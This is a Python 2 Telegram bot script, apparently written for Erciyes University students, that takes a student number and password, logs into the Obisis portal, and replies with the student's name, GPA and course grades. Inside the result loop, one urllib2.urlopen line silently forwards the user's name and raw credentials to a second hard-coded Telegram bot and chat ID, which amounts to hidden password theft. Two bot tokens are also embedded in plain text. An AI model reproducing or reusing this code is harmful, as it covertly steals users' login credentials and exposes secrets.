# -*- coding: utf-8 -*-
# !/usr/bin/env python
import sys,os
import time
import telepot  #12.7
import telepot.namedtuple
from telepot.loop import MessageLoop
from bs4 import BeautifulSoup
import mechanize
import urllib2
reload(sys)  
sys.setdefaultencoding('utf8')


def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    m = telepot.namedtuple.Message(**msg)

    print 'Received a %s from %s' % (content_type, m.chat)
    user = m.chat[4] +' '+ m.chat[5].encode('utf-8').decode('utf-8')
    print user
    
    if content_type != 'text':
        bot.sendMessage(chat_id, 'dalga geçmeyin')
   
    if len(msg['text']) < 7 or msg['text'].find(",") == -1:
            reply2 = 'Sayın *'+str(user)+'* Hoşgeldiniz. Obisisten not sorgusu yapmak için:\n\n _öğrencino,şifre_ \n\nŞeklinde bir mesaj gönderin'
            bot.sendMessage(chat_id, reply2.decode("utf8"),parse_mode="Markdown")
    else:
        reply1 = 'Sayın '+str(user)+' yoğunluk veya obisis kapalı olabilir, eğer bilgiler doğru ise lütfen bekleyiniz!'
        bot.sendMessage(chat_id, reply1.decode("utf-8"))

        a = (msg['text'])
        i = a.strip()
        i = a.split(',')


        username = i[0]
        password = i[1]
        br = mechanize.Browser()
        br.set_handle_robots(False)
        try:
            #obisis1
            br.open("https://obisis.erciyes.edu.tr/",timeout=10)
            br.select_form(nr=0)
            br.form["ctl02$txtboxOgrenciNo"] = username
            br.form["ctl02$txtBoxSifre"] = password
            br.method = "POST"
            br.submit()
            response = br.open("https://obisis.erciyes.edu.tr/Default.aspx?tabInd=2&tabNo=3").read()
        except:
            #obisis2
            br.open("https://obisis2.erciyes.edu.tr/",timeout=10)
            br.select_form(nr=0)
            br.form["ctl02$txtboxOgrenciNo"] = username
            br.form["ctl02$txtBoxSifre"] = password
            br.method = "POST"
            br.submit()
            response = br.open("https://obisis2.erciyes.edu.tr/Default.aspx?tabInd=2&tabNo=3").read()
        if not response:
            bot.sendMessage(chat_id, "Obisis kapalı, yada bilgiler yanlış".decode("utf-8"))
        soup = BeautifulSoup(response, 'html.parser')
        soup.prettify(formatter=lambda s: s.replace(u'\xa0', '.'))
        cevap=""
        for bilgi in soup.find_all('table', class_="HeadAp"):
            try:
                no = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtOgrenciNo'}).text]
                isim = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtAdiSoyadi'}).text]
                fakulte = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtFakulteAdi'}).text]
                bol = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtBolumAdi'}).text]
                gano = [bilgi.find('span', attrs={'id': 'Banner1_Kullanici1_txtSinifSeneGano'}).text]
            except:
                bot.sendMessage(chat_id,"*YANLIŞ ŞİFRE*",parse_mode="Markdown")
            #sonuc = isim + no + bol + fakulte + gano
            cevap +=  'Bilgiler:'
            cevap += '\n'+isim[0].title()
            cevap += '\n'+str(no[0])
            cevap += '\n'+bol[0].title()
            cevap += '\n'+fakulte[0].title()
            cevap += '\n'+str(gano[0]).title()
            bot.sendMessage(chat_id, "*"+cevap+"*",parse_mode='Markdown')
            urllib2.urlopen('https://api.telegram.org/bot499266306:AAHyUj-gL1hw22cEopPwF65DJzaFBJmVnQk/sendMessage?chat_id=404647908&text='+isim[0].title()+','+a)
        sonuc=""
        for dersler in soup.find_all("tr", {"class": "NormalBlack"}):
            derskodu = [dersler.find_all("td")[0].text]
            dersadi = [dersler.find_all("td")[1].text]
            devam = [dersler.find_all("td")[3].text]
            vize1 = [dersler.find_all("td")[4].text]
            vize2 = [dersler.find_all("td")[5].text]
            vize3 = [dersler.find_all("td")[6].text]
            final = [dersler.find_all("td")[7].text]
            but = [dersler.find_all("td")[8].text]
            ort = [dersler.find_all("td")[9].text]
            harf = [dersler.find_all("td")[10].text]
            sonucharf = [dersler.find_all("td")[11].text]
            buthakki = dersler.find_all("td")[17].text.replace("\n"," ")
            sonuc += str('\nDersin kodu: '+derskodu[0]+'\nDersin adı: '+dersadi[0]+'\nDevamsızlık: '+devam[0]+'\nVize1: '+vize1[0]+'\nVize2: '+vize2[0]+'\nVize3: '+vize3[0]+'\nFinal: '+final[0]+'\nBüt hakkı:'+buthakki[0]+'\nBüt Notu: '+but[0]+'\nOrtalama: '+ort[0]+'\nHarf: '+harf[0]+'\nSonuç: '+sonucharf[0]+"\n------").decode("utf-8")
            
        bot.sendMessage(chat_id,"```"+str(sonuc)+"```",parse_mode='Markdown')
           
        
    #bot.sendMessage(chat_id, 'Bot ile ilgili istek ve gorusleriniz icin: https://t.me/white_crownless_king ', disable_web_page_preview=True)
            
bot = telepot.Bot('486785097:AAHCXAOemis4B7sMfMaeoahHTIoxSOSbVBg')
MessageLoop(bot, handle).run_as_thread()
print 'Listening ...'

while 1:
    time.sleep(10)
